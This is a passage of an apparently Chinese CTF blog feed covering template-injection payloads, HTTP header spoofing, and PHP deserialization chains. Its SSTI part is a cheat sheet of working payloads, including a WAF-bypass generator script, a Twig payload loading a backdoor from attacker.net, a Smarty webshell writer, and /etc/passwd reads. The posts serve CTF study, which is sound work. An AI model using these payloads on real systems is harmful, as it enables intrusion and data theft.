class="variable">$ans</span>.=<span class="string">&#x27;+chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="过滤了双大括号"><a href="#过滤了双大括号" class="headerlink" title="过滤了双大括号{{}}"></a>过滤了双大括号{{}}</h4><p>{{…}} -&gt; {%print(…)%}</p><h4 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线"></a>过滤了下划线</h4><p>{{()|select|string}} 结果为<br>&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;<br>我们可以发现这里面出现了下划线，我们就可以造出下划线了<br>{{(()|select|string)[?]}}</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;&quot;</span></span><br><span class="line">pos = <span class="built_in">str</span>.find(<span class="string">&quot;_&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line">payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;(()|select|string)[<span class="subst">&#123;pos&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 id="过滤了-和"><a href="#过滤了-和" class="headerlink" title="过滤了.和[]"></a>过滤了.和[]</h4><p>.过滤，用[]或者|attr()<br>.__class__.-&gt;[‘__class__‘]-&gt;|attr(‘__class__‘)<br>[]过滤了，用 pop 或者__getitem__</p><pre><code>{{&#39;&#39;.__class__.__mro__.__getitem__(0)}}</code></pre><p>[40]-&gt;pop(40)</p><h4 id="过滤了-class-bases-等关键字"><a href="#过滤了-class-bases-等关键字" class="headerlink" title="过滤了 class,bases 等关键字"></a>过滤了 class,bases 等关键字</h4><p>1.拼接</p><pre><code>{{&#39;&#39;[&#39;__cl&#39;&#39;ass__&#39;][&#39;__mr&#39;&#39;o__&#39;][1][&#39;__subc&#39;&#39;lasses__&#39;]()[140][&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;popen&#39;](&#39;ls&#39;).read()}}</code></pre><p>2.倒置<br>.__class__. -&gt; ‘’[‘__ssalc__‘[::-1]]<br>3.格式化</p><pre><code>{%set ca=[&quot;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&quot;.format(95,95,99,108,97,115,115,95,95)]}{%set ca=[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]%}{%set ca=&#39;%c%c%c%c%c%c%c%c%c&#39;%(95,95,99,108,97,115,115,95,95)%}</code></pre><p>这个没写脚本，用的有点少<br>4.编码绕过<br>（1）unicode<br>__class__-&gt;[‘\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f’]<br>编码可在 cyberchef 的 escape unicode characters 中找到<br>（2）hex<br>__class__-&gt;[‘\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f’]</p><h4 id="fenjing-一把梭"><a href="#fenjing-一把梭" class="headerlink" title="fenjing 一把梭"></a>fenjing 一把梭</h4><p><a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><h4 id="fenjing-python-破解脚本"><a href="#fenjing-python-破解脚本" class="headerlink" title="fenjing python 破解脚本"></a>fenjing python 破解脚本</h4><p>waf 黑名单生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;０&quot;</span>,<span class="string">&quot;１&quot;</span>,<span class="string">&quot;２&quot;</span>,<span class="string">&quot;３&quot;</span>,<span class="string">&quot;４&quot;</span>,<span class="string">&quot;５&quot;</span>,<span class="string">&quot;６&quot;</span>,<span class="string">&quot;７&quot;</span>,<span class="string">&quot;８&quot;</span>,<span class="string">&quot;９&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>waf 返回文本生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://10.137.0.28:5000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    time.sleep(<span class="number">0.02</span>)  <span class="comment"># 防止请求发送过多</span></span><br><span class="line">    resp = requests.get(URL, timeout=<span class="number">10</span>, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;)</span><br><span class="line">    waf_text = <span class="string">&quot;BAD&quot;</span>  <span class="comment"># 被waf返回文本</span></span><br><span class="line">    <span class="keyword">return</span> waf_text <span class="keyword">not</span> <span class="keyword">in</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;ls /&quot;</span></span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自行修改~</p><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><pre><code>{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}//查看iduser={{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /f*&quot;)}}{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /etc/passwd&quot;)}}&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;cat /etc/passwd&quot;) }</code></pre><h2 id="Tornado-render"><a href="#Tornado-render" class="headerlink" title="Tornado render"></a>Tornado render</h2><pre><code>http://ip:port/error?msg={{handler.settings}}</code></pre><h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><pre><code>{$smarty.version}{if system(&#39;ls&#39;)}{/if}{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}{function+name=&#39;rce(){};@eval($_POST[1]);function%0a%0a&#39;}{/function}{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}{literal}alert(&#39;xss&#39;);{/literal}{if readfile(&#39;/flag&#39;)}{/if}</code></pre><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><pre><code>{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre>]]></content>
    
    
    <summary type="html">几乎基于jinja2模版的ssti注入</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>常见的各种http要求以及对应的headers</title>
    <link href="https://blog.hatchet.top/posts/93fc8735.html"/>
    <id>https://blog.hatchet.top/posts/93fc8735.html</id>
    <published>2024-08-25T13:38:50.000Z</published>
    <updated>2024-08-25T13:38:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GET-传参"><a href="#GET-传参" class="headerlink" title="GET 传参"></a>GET 传参</h1><p>传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0<br>xxx.com&#x2F;?a&#x3D;1&amp;b&#x3D;2&amp;c[0]&#x3D;3&amp;c[1]&#x3D;4&amp;d[]&#x3D;5</p><h1 id="POST-传参"><a href="#POST-传参" class="headerlink" title="POST 传参"></a>POST 传参</h1><p>把 GET 请求改为 POST,如果用的 burp 可以用这个一键切<br><img src="/img/http/change_request.png"></p><p>不能切的话把 GET 改为 POST，在下面加<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 0<br>Content-Length 需要改数值，建议勾选 burp 的修改 body 长度（默认勾选）不用手动更改，数值取决于你 POST 传参的长度，如 a&#x3D;4 长度为 3<br>当存在 Transfer-Encoding: chunked 时，Content-Length 会被忽略<br>没有 POST 传参最后要留两行空，不然会无法打开<br>POST 参数跟 http 头之间要空一行，后面不能有空行</p><p><img src="/img/http/post_request.png"></p><h1 id="PUT-等更多类型的传参"><a href="#PUT-等更多类型的传参" class="headerlink" title="PUT 等更多类型的传参"></a>PUT 等更多类型的传参</h1><p>直接把 GET 开头改成 PUT 就行</p><h1 id="要求-ip-地址为-127-0-0-1-要求本地权限"><a href="#要求-ip-地址为-127-0-0-1-要求本地权限" class="headerlink" title="要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限"></a>要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限</h1><p>这种要求如果在 http 题中只要 xff 伪造 ip 就行，如果要 ssrf 伪造它就不是 http 题</p><p>X-Forwarded-For: 127.0.0.1<br>Client-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>这三个任选添加，都可能通过，大小写随意，注意 xff 的 ed 不要少写。</p><h1 id="要求挂代理"><a href="#要求挂代理" class="headerlink" title="要求挂代理"></a>要求挂代理</h1><p>via: xxx.vip</p><h1 id="SERVER-‘FLAG’-’123’等-php-参数"><a href="#SERVER-‘FLAG’-’123’等-php-参数" class="headerlink" title="$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数"></a>$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数</h1><p>FLAG: 123</p><h1 id="要求改-UA-浏览器"><a href="#要求改-UA-浏览器" class="headerlink" title="要求改 UA &#x2F; 浏览器"></a>要求改 UA &#x2F; 浏览器</h1><p>User-Agent: Firefox Browser</p><h1 id="要求你的邮件地址"><a href="#要求你的邮件地址" class="headerlink" title="要求你的邮件地址"></a>要求你的邮件地址</h1><p>From: <a href="mailto:&#x78;&#x78;&#120;&#x40;&#x65;&#x78;&#x61;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x78;&#x78;&#120;&#x40;&#x65;&#x78;&#x61;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;</a></p><h1 id="要求来自-网址-origin"><a href="#要求来自-网址-origin" class="headerlink" title="要求来自 网址 (origin)"></a>要求来自 网址 (origin)</h1><p>Referer: xxx.org</p><h1 id="要求改-Cookie"><a href="#要求改-Cookie" class="headerlink" title="要求改 Cookie"></a>要求改 Cookie</h1><p>格式如 Cookie: user&#x3D;admin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GET-传参&quot;&gt;&lt;a href=&quot;#GET-传参&quot; class=&quot;headerlink&quot; title=&quot;GET 传参&quot;&gt;&lt;/a&gt;GET 传参&lt;/h1&gt;&lt;p&gt;传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0&lt;br&gt;xxx.com&amp;#x2F;?a&amp;#x</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>php的pop链构造&amp;反序列化</title>
    <link href="https://blog.hatchet.top/posts/32daafef.html"/>
    <id>https://blog.hatchet.top/posts/32daafef.html</id>
    <published>2024-08-25T11:46:24.000Z</published>
    <updated>2024-08-25T11:46:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的开始和结尾。</p><h1 id="部分魔术方法触发方法"><a href="#部分魔术方法触发方法" class="headerlink" title="部分魔术方法触发方法"></a>部分魔术方法触发方法</h1><p><strong>__wakeup()</strong> 使用 unserialize()时触发<br><strong>__construct()</strong> 当创建对象时触发<br><strong>__destruct()</strong> 当一个对象被销毁时触发<br><strong>__toString()</strong> 当一个类被当成字符串使用时触发，如 echo<br><strong>__invoke()</strong> 当尝试以调用函数的方式调用一个对象时触发<br><strong>__call()</strong> 在对象上下文中调用不可访问的方法时触发<br><strong>__callStatic()</strong> 在静态上下文中调用不可访问的方法时触发<br><strong>__get()</strong> 用于从不可访问的属性读取数据<br><strong>__set()</strong> 用于将数据写入不可访问的属性<br><strong>__isset()</strong> 在不可访问的属性上调用 isset()或 empty()触发<br><strong>__unset()</strong> 在不可访问的属性上使用 unset()时触发<br><strong>__sleep()</strong> 使用 serialize()时触发</p><h1 id="不含绕过的链子构造"><a href="#不含绕过的链子构造" class="headerlink" title="不含绕过的链子构造"></a>不含绕过的链子构造</h1><p>__wakeup(),__construct(),__destruct() 都可以看做开头，优先级从左到右。你要做的，就是引导这个绳子头，直至穿到危险函数。</p><p>我们来看一道例题，这是我在学习构造 pop 链时做出的第一道题，出自 Geek Challenge 2024 unsign</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)#4</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();<span class="comment">#3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;<span class="comment">#2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);<span class="comment">#1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先我们注意到 class web 下存在一种很危险的格式<br>**$eva1($this-&gt;interesting);<strong>也就是在 eva1&#x3D;”eval”时，就等于 eval()了，所以它作为尾。标个 1<br>然后我们需要触发__get()方法。这个方法常在调用私有或不存在对象时触发。怎么触发呢，我们观察 php 代码，观察到 lover 下的</strong>return $this-&gt;yxx-&gt;QW;**很可疑。我们可以控制 yxx 的 class，将它设为 web。这样当这条语句触发时，QW 找不到，就会触发我们的**get()，标为 2<br>__invoke()算是最容易看出来的方法了，只要变量作为函数来调用就会触发。所以 syc 的$function();可以触发。标个 3<br>destruct 可以作为头，结束 标个 4<br>所以链子总结如下</p><pre><code>url-&gt;syc#__destruct()-&gt;cuit-&gt;lover#\_\_invoke(&#39;$function&#39;)-&gt;yxx-&gt;web#\_\_get(&#39;QW&#39;)-&gt;system(&#39;cat /flag&#39;)</code></pre><p>关键 exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$syc</span>=<span class="keyword">new</span> <span class="title function_ invoke__">syc</span>();</span><br><span class="line"><span class="variable">$lover</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$web</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$syc</span>;</span><br><span class="line"><span class="variable">$url</span>-&gt;cuit=<span class="variable">$lover</span>;</span><br><span class="line"><span class="variable">$lover</span>-&gt;yxx=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$url</span>);<span class="comment">//url-&gt;syc#__destruct()-&gt;cuit-&gt;lover#__invoke(&#x27;$function&#x27;)-&gt;yxx-&gt;web#__get(&#x27;QW&#x27;)-&gt;system(&#x27;cat /flag&#x27;)</span></span><br></pre></td></tr></table></figure><h1 id="需要绕过的链子构造"><a href="#需要绕过的链子构造" class="headerlink" title="需要绕过的链子构造"></a>需要绕过的链子构造</h1><h2 id="private-和-protected-属性的变量"><a href="#private-和-protected-属性的变量" class="headerlink" title="private 和 protected 属性的变量"></a>private 和 protected 属性的变量</h2><p>输出 serialize 时一定要经过编码，基本是 url 编码，如果题目要求 base64 编码就不用先 url 编码了<br>如果你要对 private 和 protected 里的数赋值时，如果 php 版本低可能没回显。<br>养成良好习惯，使用__construct()赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> a=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> b;</span><br><span class="line">    <span class="keyword">protected</span> c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强调下 construct 的赋值方式，不能直接写$b,要写$this-&gt;b,且 function 前加 public。</p><h2 id="str-replace-替换字符导致的字符串逃逸"><a href="#str-replace-替换字符导致的字符串逃逸" class="headerlink" title="str_replace 替换字符导致的字符串逃逸"></a>str_replace 替换字符导致的字符串逃逸</h2><p>比如替换函数为 str_replace(‘SDPCSEC’,’hacker’,$parm);我们注意到每次替换就少了一个字符，但被替换的字符串前的数字没有变，所以我们就可以构造字符个数，每输出一次就会吞掉后面一个字符，最后的参数就由你自己控制了。<br>一个参考的输出程序，可以把篡改字符串放在$a 里，注意开头要加”用于闭合引号</p><h3 id="字符变少"><a href="#字符变少" class="headerlink" title="字符变少"></a>字符变少</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&quot;;s:1:&quot;B&quot;;s:12:&quot;[phpinfo();]&quot;;s:1:&quot;C&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;SDPCSEC&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h3><p>提前闭合，因为反序列化会舍去;}后的任何内容。<br>轮子还没造，待实现中。。。</p><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="wakeup 绕过"></a>wakeup 绕过</h2><h3 id="增加属性对象绕过（CVE-2016-7124）"><a href="#增加属性对象绕过（CVE-2016-7124）" class="headerlink" title="增加属性对象绕过（CVE-2016-7124）"></a>增加属性对象绕过（CVE-2016-7124）</h3><pre><code>PHP5 &lt; 5.6.25 和 PHP7 &lt; 7.0.10</code></pre><p>我们增加 :{ 前的数字，这会绕过 wakeup 检测。</p><pre><code>O:7:&quot;Secrect&quot;:2:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><p>绕过为</p><pre><code>O:7:&quot;Secrect&quot;:3:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><h3 id="C-开头绕过"><a href="#C-开头绕过" class="headerlink" title="C 开头绕过"></a>C 开头绕过</h3><p>将 O 改成 C 就可以，但是弊端就是这个类中的对象都没有属性了，也就是不能命令执行<br>如果碰到需要命令执行就得多几步了，正好 ArrayObject 内置类可以构造以 C 开头的反序列化 <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p><h2 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h2><pre><code>O:4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>假设此时的匹配为(preg_match(‘&#x2F;username&#x2F;‘, $data));这时你可以把 username 前的 s 大写，并将你要绕过的内容或一部分转为 16 进制，如</p><pre><code>O:4:&quot;Test&quot;:1:&#123;S:8:&quot;\75sername&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>如果此时的匹配为(preg_match(‘&#x2F;O:[%d]’, $data));你可以这么写</p><pre><code>O:+4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h2 id="两变量哈希相等"><a href="#两变量哈希相等" class="headerlink" title="两变量哈希相等"></a>两变量哈希相等</h2><h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><p>b 取 a 的地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a === <span class="variable language_">$this</span>-&gt;b) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;b=&amp;<span class="variable">$test</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure><h3 id="内置类绕过"><a href="#内置类绕过" class="headerlink" title="内置类绕过"></a>内置类绕过</h3><h4 id="Error（仅能用于-PHP7）"><a href="#Error（仅能用于-PHP7）" class="headerlink" title="Error（仅能用于 PHP7）"></a>Error（仅能用于 PHP7）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span 